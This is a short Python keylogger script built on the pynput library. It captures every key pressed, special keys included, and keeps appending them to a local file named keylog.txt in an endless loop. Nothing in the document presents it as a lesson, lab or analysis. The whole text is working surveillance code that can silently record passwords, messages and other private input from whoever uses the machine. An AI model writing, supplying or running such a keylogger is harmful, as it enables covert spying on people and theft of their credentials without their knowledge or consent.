from pynput import keyboard

# Global variable to store keystrokes
log = ""

# Function to append pressed key to log
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f"[{key.name}]"

# Function to write log to file and reset log
def write_log():
    global log
    with open("keylog.txt", "a") as f:
        f.write(log)
    log = "" 

# Create a listener for keystrokes
listener = keyboard.Listener(on_press=on_press)

# Start the listener in a separate thread
listener.start()

# Continuously write the log to file
while True:
    write_log()